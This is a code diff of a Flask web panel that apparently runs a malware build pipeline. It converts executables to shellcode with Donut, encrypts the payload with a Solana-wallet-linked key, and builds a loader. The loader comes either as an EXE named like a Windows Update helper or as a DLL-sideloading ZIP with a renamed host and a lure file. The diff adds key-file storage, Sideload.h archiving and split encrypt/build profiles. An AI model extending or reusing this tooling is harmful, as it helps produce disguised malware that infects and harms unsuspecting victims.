@@ -7,7 +7,7 @@ Storage layout
 web/data/profiles.json           ← build profiles only
 web/workspace/donut/<id>/        ← donut job: meta.json + original file + shellcode.bin
 web/workspace/solana/<id>/       ← wallet:    meta.json + keypair.json
-web/workspace/encrypt/<id>/      ← encrypt run: meta.json + Payload.h + memo.txt + <name>.dat
+web/workspace/encrypt/<id>/      ← encrypt run: meta.json + Payload.h + key.txt + data.enc
 web/workspace/builds/<id>/       ← build run:   meta.json + output.txt + <binary>
 """
 from __future__ import annotations
@@ -33,7 +33,7 @@ WORKSPACE      = WEB_DIR / "workspace"
 DATA_DIR       = WEB_DIR / "data"
 WALLETS_DIR         = WORKSPACE / "solana"    # each subdir: meta.json + keypair.json
 DONUT_DIR           = WORKSPACE / "donut"     # each subdir: meta.json + files
-ENCRYPT_HISTORY_DIR = WORKSPACE / "encrypt"  # each subdir: meta.json + Payload.h + memo.txt + payload.dat
+ENCRYPT_HISTORY_DIR = WORKSPACE / "encrypt"  # each subdir: meta.json + Payload.h + key.txt + data.enc
 BUILD_HISTORY_DIR   = WORKSPACE / "builds"   # each subdir: meta.json + output.txt + binary (+ zip for sideload)
 DLLS_DIR            = WORKSPACE / "dlls"     # each subdir: meta.json + the DLL file
 EXES_DIR            = WORKSPACE / "exes"     # each subdir: meta.json + the EXE file
@@ -133,16 +133,6 @@ def _load_donut_jobs() -> list:
 
 
 # ── Encrypt / Build history ───────────────────────────────────────────────
-
-def _derive_dat_name(url: str) -> str:
-    """Mirror Encrypt.py's derive_output_filename: basename of the URL path."""
-    from urllib.parse import urlparse
-    path = urlparse(url).path
-    name = path.rsplit("/", 1)[-1].strip()
-    if not name or "/" in name or "\\" in name or name in (".", ".."):
-        return "payload.dat"
-    return name
-
 
 def _load_encrypt_history() -> list:
     jobs: list[dict] = []
@@ -258,15 +248,25 @@ def _cleanup_build_artifacts(binary_name: str | None = None) -> None:
                     b.unlink()
                 except Exception:
                     pass
+    # Generated header files (already archived in history on success)
+    for fname in ("Payload.h", "Sideload.h", "Sideload.rc"):
+        f = PROJECT_ROOT / fname
+        if f.is_file():
+            try:
+                f.unlink()
+            except Exception:
+                pass
 
 
 def _save_build_history(
     job_id: str, data: dict, mode: str, output_arg: str,
     returncode: int, output_text: str,
     zip_info: dict | None = None,
+    sideload_h_size: int = 0,
 ) -> None:
     """Persist build run to workspace/builds/<id>/.
     zip_info: {"name": "<file>.zip", "size": N} — already written to hist_dir by caller.
+    sideload_h_size: byte size of Sideload.h already copied to hist_dir (0 if absent).
     """
     ok          = (returncode == 0)
     binary_name = "WUAssistant.exe" if mode == "exe" else (output_arg if output_arg else "sideload.dll")
@@ -275,18 +275,19 @@ def _save_build_history(
     hist_dir.mkdir(parents=True, exist_ok=True)
 
     meta: dict = {
-        "id":          job_id,
-        "created_at":  int(time.time()),
-        "ok":          ok,
-        "mode":        mode,
-        "binary_name": binary_name,
-        "binary_size": 0,
-        "uac":         bool(data.get("uac")),
-        "rwx":         bool(data.get("rwx")),
-        "debug":       bool(data.get("debug")),
-        "synthetic":   bool(data.get("synthetic")),
-        "zip_name":    zip_info.get("name") if zip_info else None,
-        "zip_size":    zip_info.get("size", 0) if zip_info else 0,
+        "id":             job_id,
+        "created_at":     int(time.time()),
+        "ok":             ok,
+        "mode":           mode,
+        "binary_name":    binary_name,
+        "binary_size":    0,
+        "uac":            bool(data.get("uac")),
+        "rwx":            bool(data.get("rwx")),
+        "debug":          bool(data.get("debug")),
+        "synthetic":      bool(data.get("synthetic")),
+        "zip_name":       zip_info.get("name") if zip_info else None,
+        "zip_size":       zip_info.get("size", 0) if zip_info else 0,
+        "sideload_h_size": sideload_h_size,
     }
 
     try:
@@ -337,10 +338,6 @@ def index():
 
 @app.route("/api/encrypt", methods=["POST"])
 def api_encrypt():
-    url = (request.form.get("url") or "").strip()
-    if not url or not url.startswith(("http://", "https://")):
-        return jsonify({"ok": False, "stderr": "url must start with http:// or https://"}), 400
-
     # Wallet: from stored wallet ID or manual address input
     wallet_id  = (request.form.get("wallet_id") or "").strip()
     sol_wallet = (request.form.get("sol_wallet") or "").strip()
@@ -360,15 +357,23 @@ def api_encrypt():
                 wallet_id = _w["id"]
                 break
 
-    rpc_url = (request.form.get("rpc_url") or "").strip()
-
     # Shellcode: from Donut workspace job or direct file upload
     shellcode_job_id = (request.form.get("shellcode_job_id") or "").strip()
+    donut_label = ""
+    donut_original_name = ""
     if shellcode_job_id and _ID_RE.match(shellcode_job_id):
         sc_path = DONUT_DIR / shellcode_job_id / "shellcode.bin"
         if not sc_path.is_file():
             return jsonify({"ok": False,
                             "stderr": f"shellcode.bin not found for Donut job {shellcode_job_id}"}), 404
+        dmf = DONUT_DIR / shellcode_job_id / "meta.json"
+        if dmf.is_file():
+            try:
+                dmeta = json.loads(dmf.read_text(encoding="utf-8"))
+                donut_label         = dmeta.get("label", "")
+                donut_original_name = dmeta.get("original_name", "")
+            except Exception:
+                pass
     elif "shellcode" in request.files and request.files["shellcode"].filename:
         upload  = request.files["shellcode"]
         name    = _safe_name(upload.filename or "shellcode.bin") or "shellcode.bin"
@@ -378,41 +383,40 @@ def api_encrypt():
         return jsonify({"ok": False,
                         "stderr": "shellcode source required — select a Donut job or upload a .bin file"}), 400
 
-    argv = [sys.executable, "Encrypt.py", str(sc_path), "--url", url, "--sol-wallet", sol_wallet]
-    if rpc_url.startswith(("http://", "https://")):
-        argv += ["--rpc", rpc_url]
+    argv = [sys.executable, "Encrypt.py", str(sc_path), "--sol-wallet", sol_wallet]
     result = _run(argv)
 
     payload_path = PROJECT_ROOT / "Payload.h"
     if payload_path.is_file():
         result["payload_preview"] = payload_path.read_text(errors="replace")[:4096]
         result["payload_bytes"]   = payload_path.stat().st_size
-    memo_path = PROJECT_ROOT / "memo.txt"
-    memo_text = ""
-    if memo_path.is_file():
-        memo_text = memo_path.read_text(errors="replace").strip()
-        result["memo"] = memo_text
+    key_path = PROJECT_ROOT / "key.txt"
+    key_text = ""
+    if key_path.is_file():
+        key_text = key_path.read_text(errors="replace").strip()
+        result["key"] = key_text
 
     # ── Persist to encrypt history ─────────────────────────────────────────
     job_id   = _new_id()
     hist_dir = ENCRYPT_HISTORY_DIR / job_id
     hist_dir.mkdir(parents=True, exist_ok=True)
 
-    dat_name = _derive_dat_name(url)
+    dat_name = "data.enc"
     dat_src  = PROJECT_ROOT / dat_name
     meta: dict = {
-        "id":             job_id,
-        "created_at":     int(time.time()),
-        "ok":             result["ok"],
-        "url":            url,
-        "wallet":         sol_wallet,
-        "wallet_id":      wallet_id,   # workspace wallet ID if resolved, "" otherwise
-        "shellcode":      sc_path.name,
-        "dat_name":       dat_name,
-        "dat_size":       0,
-        "payload_h_size": 0,
-        "memo":           memo_text,
-        "rpc_url":        rpc_url,     # preserve for re-publish
+        "id":                  job_id,
+        "created_at":          int(time.time()),
+        "ok":                  result["ok"],
+        "wallet":              sol_wallet,
+        "wallet_id":           wallet_id,
+        "shellcode":           sc_path.name,
+        "shellcode_job_id":    shellcode_job_id,
+        "donut_label":         donut_label,
+        "donut_original_name": donut_original_name,
+        "dat_name":            dat_name,
+        "dat_size":            0,
+        "payload_h_size":      0,
+        "key":                 key_text,
     }
     if payload_path.is_file():
         try:
@@ -420,9 +424,9 @@ def api_encrypt():
             meta["payload_h_size"] = payload_path.stat().st_size
         except Exception:
             pass
-    if memo_path.is_file():
+    if key_path.is_file():
         try:
-            shutil.copy2(str(memo_path), str(hist_dir / "memo.txt"))
+            shutil.copy2(str(key_path), str(hist_dir / "key.txt"))
         except Exception:
             pass
     if dat_src.is_file():
@@ -435,6 +439,14 @@ def api_encrypt():
         (hist_dir / "meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
     except Exception:
         pass
+
+    # Clean generated files from PROJECT_ROOT — they're now archived in history
+    for _f in [payload_path, key_path, dat_src]:
+        try:
+            if _f.is_file():
+                _f.unlink()
+        except Exception:
+            pass
 
     result["job_id"] = job_id
     return jsonify(result)
@@ -459,13 +471,11 @@ def api_encrypt_history_download(jid, ftype):
 
     if ftype == "payload_h":
         path, dl = job_dir / "Payload.h", "Payload.h"
-    elif ftype == "memo":
-        path, dl = job_dir / "memo.txt", "memo.txt"
     elif ftype == "dat":
         mf = job_dir / "meta.json"
         if not mf.is_file():
             return "not found", 404
-        dat_name = json.loads(mf.read_text()).get("dat_name", "payload.dat")
+        dat_name = json.loads(mf.read_text()).get("dat_name", "data.enc")
         safe = _safe_name(dat_name)
         if not safe:
             return "invalid", 400
@@ -533,6 +543,14 @@ def api_build():
     rwx    = bool(data.get("rwx"))
     debug  = bool(data.get("debug"))
     synth  = bool(data.get("synthetic"))
+
+    # ── Payload.h: copy from encrypt history if requested ────────────────
+    enc_hist_id = (data.get("encrypt_history_id") or "").strip()
+    if enc_hist_id and _ID_RE.match(enc_hist_id):
+        ph_src = ENCRYPT_HISTORY_DIR / enc_hist_id / "Payload.h"
+        ph_dst = PROJECT_ROOT / "Payload.h"
+        if ph_src.is_file():
+            shutil.copy2(str(ph_src), str(ph_dst))
 
     # ── sideload-specific inputs ──────────────────────────────────────────
     dll_id          = (data.get("dll_id")          or "").strip()
@@ -728,8 +746,22 @@ def api_build():
                     zline = f"\n[!] ZIP creation failed: {ze}\n"
                     yield zline; buf.append(zline)
 
+            # ── Step 4: save Sideload.h (sideload success only) ───────────
+            sideload_h_size = 0
+            if ok and mode == "sideload":
+                sh_src = PROJECT_ROOT / "Sideload.h"
+                if sh_src.is_file():
+                    try:
+                        _hd = BUILD_HISTORY_DIR / job_id
+                        _hd.mkdir(parents=True, exist_ok=True)
+                        dest = _hd / "Sideload.h"
+                        shutil.copy2(str(sh_src), str(dest))
+                        sideload_h_size = dest.stat().st_size
+                    except Exception:
+                        pass
+
             _save_build_history(job_id, data, mode, effective_output, returncode,
-                                "".join(buf), zip_info or None)
+                                "".join(buf), zip_info or None, sideload_h_size)
             _cleanup_build_artifacts(effective_output)
 
     return Response(stream(), mimetype="text/plain; charset=utf-8")
@@ -809,6 +841,8 @@ def api_build_history_download(jid, ftype):
         if not safe:
             return "invalid", 400
         path, dl = job_dir / safe, safe
+    elif ftype == "sideload_h":
+        path, dl = job_dir / "Sideload.h", "Sideload.h"
     else:
         return "invalid", 400
 
@@ -828,40 +862,58 @@ def api_build_history_delete(jid):
 
 
 # ---------------------------------------------------------------------------
-# Build profiles  (web/data/profiles.json)
+# Profiles  (web/data/profiles.json)
+# type = "encrypt" | "build"   (legacy entries without type treated as "encrypt")
 # ---------------------------------------------------------------------------
 
-@app.route("/api/profiles")
-def api_profiles_list():
-    return jsonify(_load_profiles())
+@app.route("/api/profiles/encrypt")
+def api_profiles_encrypt_list():
+    return jsonify([p for p in _load_profiles() if p.get("type", "encrypt") == "encrypt"])
 
 
-@app.route("/api/profiles", methods=["POST"])
-def api_profiles_create():
+@app.route("/api/profiles/encrypt", methods=["POST"])
+def api_profiles_encrypt_create():
     data = request.get_json(force=True, silent=True) or {}
     profile = {
         "id":               _new_id(),
+        "type":             "encrypt",
         "name":             (data.get("name") or "Unnamed").strip(),
-        # ── Encrypt tab ──────────────────────────────────────────────────
-        "url":              data.get("url", ""),
         "sol_wallet":       data.get("sol_wallet", ""),
-        "rpc_url":          data.get("rpc_url", ""),
         "shellcode_job_id": data.get("shellcode_job_id", ""),
-        # ── Sideload tab ─────────────────────────────────────────────────
-        "dll_id":           data.get("dll_id", ""),            # DLL workspace item
-        "exe_id":           data.get("exe_id", ""),            # EXE workspace item
-        "sideload_rename":  data.get("sideload_rename", ""),   # original DLL rename
-        "host_rename":      data.get("host_rename", ""),       # host EXE rename in ZIP
-        "zip_name":         data.get("zip_name", ""),          # output ZIP filename
-        "bind_id":          data.get("bind_id", ""),           # bind/lure file workspace item
-        "bind_rename":      data.get("bind_rename", ""),       # bind file rename inside _\
-        # ── Build tab ────────────────────────────────────────────────────
-        "mode":             data.get("mode", "exe"),
-        "uac":              bool(data.get("uac")),
-        "rwx":              bool(data.get("rwx")),
-        "debug":            bool(data.get("debug")),
-        "synthetic":        bool(data.get("synthetic")),
         "created_at":       int(time.time()),
+    }
+    profiles = _load_profiles()
+    profiles.insert(0, profile)
+    _save_profiles(profiles)
+    return jsonify({"ok": True, "profile": profile})
+
+
+@app.route("/api/profiles/build")
+def api_profiles_build_list():
+    return jsonify([p for p in _load_profiles() if p.get("type") == "build"])
+
+
+@app.route("/api/profiles/build", methods=["POST"])
+def api_profiles_build_create():
+    data = request.get_json(force=True, silent=True) or {}
+    profile = {
+        "id":                  _new_id(),
+        "type":                "build",
+        "name":                (data.get("name") or "Unnamed").strip(),
+        "encrypt_history_id":  data.get("encrypt_history_id", ""),
+        "dll_id":              data.get("dll_id", ""),
+        "exe_id":              data.get("exe_id", ""),
+        "sideload_rename":     data.get("sideload_rename", ""),
+        "host_rename":         data.get("host_rename", ""),
+        "zip_name":            data.get("zip_name", ""),
+        "bind_id":             data.get("bind_id", ""),
+        "bind_rename":         data.get("bind_rename", ""),
+        "mode":                data.get("mode", "exe"),
+        "uac":                 bool(data.get("uac")),
+        "rwx":                 bool(data.get("rwx")),
+        "debug":               bool(data.get("debug")),
+        "synthetic":           bool(data.get("synthetic")),
+        "created_at":          int(time.time()),
     }
     profiles = _load_profiles()
     profiles.insert(0, profile)
@@ -879,26 +931,30 @@ def api_profiles_update(pid):
     if idx is None:
         return jsonify({"ok": False, "error": "not found"}), 404
     existing = profiles[idx]
-    existing.update({
-        "name":             (data.get("name") or existing["name"]).strip(),
-        "url":              data.get("url",              existing.get("url", "")),
-        "sol_wallet":       data.get("sol_wallet",       existing.get("sol_wallet", "")),
-        "rpc_url":          data.get("rpc_url",          existing.get("rpc_url", "")),
-        "shellcode_job_id": data.get("shellcode_job_id", existing.get("shellcode_job_id", "")),
-        "dll_id":           data.get("dll_id",           existing.get("dll_id", "")),
-        "exe_id":           data.get("exe_id",           existing.get("exe_id", "")),
-        "sideload_rename":  data.get("sideload_rename",  existing.get("sideload_rename", "")),
-        "host_rename":      data.get("host_rename",      existing.get("host_rename", "")),
-        "zip_name":         data.get("zip_name",         existing.get("zip_name", "")),
-        "bind_id":          data.get("bind_id",          existing.get("bind_id", "")),
-        "bind_rename":      data.get("bind_rename",      existing.get("bind_rename", "")),
-        "mode":             data.get("mode",             existing.get("mode", "exe")),
-        "uac":              bool(data.get("uac")),
-        "rwx":              bool(data.get("rwx")),
-        "debug":            bool(data.get("debug")),
-        "synthetic":        bool(data.get("synthetic")),
-        "updated_at":       int(time.time()),
-    })
+    ptype = existing.get("type", "encrypt")
+    update = {"name": (data.get("name") or existing["name"]).strip(), "updated_at": int(time.time())}
+    if ptype == "encrypt":
+        update.update({
+            "sol_wallet":       data.get("sol_wallet",       existing.get("sol_wallet", "")),
+            "shellcode_job_id": data.get("shellcode_job_id", existing.get("shellcode_job_id", "")),
+        })
+    else:
+        update.update({
+            "encrypt_history_id": data.get("encrypt_history_id", existing.get("encrypt_history_id", "")),
+            "dll_id":             data.get("dll_id",          existing.get("dll_id", "")),
+            "exe_id":             data.get("exe_id",          existing.get("exe_id", "")),
+            "sideload_rename":    data.get("sideload_rename", existing.get("sideload_rename", "")),
+            "host_rename":        data.get("host_rename",     existing.get("host_rename", "")),
+            "zip_name":           data.get("zip_name",        existing.get("zip_name", "")),
+            "bind_id":            data.get("bind_id",         existing.get("bind_id", "")),
+            "bind_rename":        data.get("bind_rename",     existing.get("bind_rename", "")),
+            "mode":               data.get("mode",            existing.get("mode", "exe")),
+            "uac":                bool(data.get("uac")),
+            "rwx":                bool(data.get("rwx")),
+            "debug":              bool(data.get("debug")),
+            "synthetic":          bool(data.get("synthetic")),
+        })
+    existing.update(update)
     profiles[idx] = existing
     _save_profiles(profiles)
     return jsonify({"ok": True, "profile": existing})
@@ -940,6 +996,7 @@ def api_donut():
 
     upload   = request.files["exe"]
     name     = _safe_name(upload.filename or "payload.exe") or "payload.exe"
+    label    = (request.form.get("label") or "").strip()[:64]
     exe_path = job_dir / name
     upload.save(str(exe_path))
     out_path = job_dir / "shellcode.bin"
@@ -948,6 +1005,7 @@ def api_donut():
     meta = {
         "id":            job_id,
         "original_name": name,
+        "label":         label,
         "arch":          arch,
         "arch_label":    arch_label,
         "created_at":    int(time.time()),
@@ -980,6 +1038,21 @@ def api_donut_download(jid, ftype):
     if not path.is_file():
         return "not found", 404
     return send_file(str(path), as_attachment=True, download_name=dl)
+
+
+@app.route("/api/donut/jobs/<jid>", methods=["PATCH"])
+def api_donut_patch(jid):
+    if not _ID_RE.match(jid):
+        return jsonify({"ok": False}), 400
+    data  = request.get_json(force=True, silent=True) or {}
+    label = (data.get("label") or "").strip()[:64]
+    mf    = DONUT_DIR / jid / "meta.json"
+    if not mf.is_file():
+        return jsonify({"ok": False, "stderr": "job not found"}), 404
+    meta          = json.loads(mf.read_text())
+    meta["label"] = label
+    mf.write_text(json.dumps(meta, indent=2))
+    return jsonify({"ok": True, "meta": meta})
 
 
 @app.route("/api/donut/jobs/<jid>", methods=["DELETE"])
